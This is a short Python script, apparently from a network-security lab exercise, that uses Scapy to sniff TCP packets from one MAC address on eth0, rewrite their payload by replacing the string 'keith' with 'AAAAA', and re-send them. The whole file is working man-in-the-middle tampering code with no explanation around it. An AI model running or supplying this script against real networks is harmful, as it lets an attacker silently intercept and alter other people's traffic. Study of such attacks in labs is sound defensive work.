#!/usr/bin/env python3
from scapy.all import *
def spoof_pkt(pkt):
    
    newpkt = IP(bytes(pkt[IP]))
    del(newpkt.chksum)
    del(newpkt[TCP].payload)
    del(newpkt[TCP].chksum)
    
    if pkt[TCP].payload:
        data = pkt[TCP].payload.load
        print("*** %s, length: %d" % (data, len(data)))
        # Replace a pattern
        newdata = data.replace(b'keith', b'AAAAA')
        send(newpkt/newdata)
    else:
        send(newpkt)
f = 'tcp and ether src 02:42:0a:09:00:05'

pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
